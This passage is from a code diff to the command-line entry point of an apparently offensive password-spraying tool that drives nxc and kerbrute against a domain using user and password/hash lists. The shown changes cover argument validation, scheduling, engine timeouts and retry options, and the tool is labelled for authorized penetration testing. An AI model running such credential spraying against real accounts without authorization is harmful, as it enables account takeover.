+        (args.feed_lines >= 1, "--feed-lines must be at least 1"),
+        (args.engine_cooldown >= 1, "--engine-cooldown must be at least 1"),
+        (args.engine_fail_threshold >= 1, "--engine-fail-threshold must be at least 1"),
+        (args.engine_timeout >= 1, "--engine-timeout must be at least 1"),
+        (args.engine_idle_timeout >= 1, "--engine-idle-timeout must be at least 1"),
+    ]
+    for valid, message in numeric_constraints:
+        if not valid:
+            parser.error(message)
+
+    if args.schedule:
+        try:
+            SprayWindow(args.schedule)
+        except ValueError as exc:
+            parser.error(f"invalid --schedule: {exc}")
 
     # Validate inputs
     if not os.path.isfile(args.u):
@@ -2248,6 +5340,11 @@ For authorized penetration testing only.
             sys.exit(1)
 
     # Build Config
+    if args.log_dir:
+        resolved_log_dir = args.log_dir
+    else:
+        resolved_log_dir = "./authtempo-dry-run-out" if args.dry_run else "./authtempo-out"
+
     cfg = Config(
         userfile=args.u,
         passfile=args.p,
@@ -2264,14 +5361,26 @@ For authorized penetration testing only.
         nxc_path=args.nxc_path,
         kerbrute_path=args.kerbrute_path,
         resume=args.resume,
+        start_fresh=args.start_fresh,
         dry_run=args.dry_run,
         no_preflight=args.no_preflight,
-        log_dir=args.log_dir,
+        log_dir=resolved_log_dir,
         filter_disabled=args.filter_disabled,
         export=args.export,
         schedule=args.schedule or "",
         timeline=args.timeline,
         feed_lines=args.feed_lines,
+        engine_cooldown_rounds=args.engine_cooldown,
+        engine_transient_threshold=args.engine_fail_threshold,
+        realm_retry=not args.no_realm_retry,
+        verbose=args.verbose,
+        live_ui=not args.no_live,
+        force_live_ui=args.live,
+        retry_compromised=args.include_compromised,
+        retry_indeterminate=args.retry_indeterminate,
+        engine_timeout_seconds=args.engine_timeout,
+        engine_idle_timeout_seconds=args.engine_idle_timeout,
+        probe_demoted=args.probe_demoted,
         nxc_binary=nxc_bin,
         kerbrute_binary=kerbrute_bin,
     )
@@ -2279,13 +5388,12 @@ For authorized penetration testing only.
     # Derive realm candidates for kerbrute auto-retry
     cfg.realm_candidates = derive_realm_candidates(cfg.domain)
 
-    # Load users and passwords (skip blank lines and '#'-comment lines)
-    def _read_lines(path: str):
-        with open(path, "r") as fh:
-            return [ln.strip() for ln in fh if ln.strip() and not ln.strip().startswith("#")]
-
-    cfg.users = _read_lines(args.u)
-    cfg.passwords = _read_lines(args.p)
+    try:
+        cfg.users = read_input_lines(args.u, identities=True, domain=cfg.domain)
+        cfg.passwords = read_input_lines(args.p, identities=False)
+    except (OSError, UnicodeError, ValueError) as exc:
+        parser.error(str(exc))
+    cfg.source_users = list(cfg.users)
 
     if not cfg.users:
         console.print("[!] No users found in userfile", style="red")
@@ -2295,8 +5403,8 @@ For authorized penetration testing only.
         console.print("[!] No passwords/hashes found in password file", style="red")
         sys.exit(1)
 
-    # Author note
-    console.print("[*] Spraygun — for authorized penetration testing only", style="dim")
+    console.print(f"[*] {PRODUCT_NAME} — {PRODUCT_TAGLINE}", style="dim")
+    console.print("[*] For authorized penetration testing only", style="dim")
     console.print(f"[*] Loaded {len(cfg.users)} users, {len(cfg.passwords)} secrets", style="cyan")
 
     # Show realm candidates if using kerbrute
@@ -2305,11 +5413,19 @@ For authorized penetration testing only.
 
     # Run
     try:
-        run(cfg, console)
+        completed = run(cfg, console)
+        if not completed:
+            sys.exit(2)
+    except (RuntimeError, ValueError) as e:
+        console.print(f"[!] Refusing to run: {e}", style="red")
+        sys.exit(1)
     except Exception as e:
-        console.print(f"[!] Fatal error: {e}", style="red")
-        import traceback
-        console.print(traceback.format_exc(), style="dim")
+        console.print(f"[!] Unexpected fatal error: {e}", style="red")
+        if args.verbose:
+            import traceback
+            console.print(traceback.format_exc(), style="dim")
+        else:
+            console.print("    Re-run with --verbose for a traceback.", style="dim")
         sys.exit(1)
 
 if __name__ == "__main__":
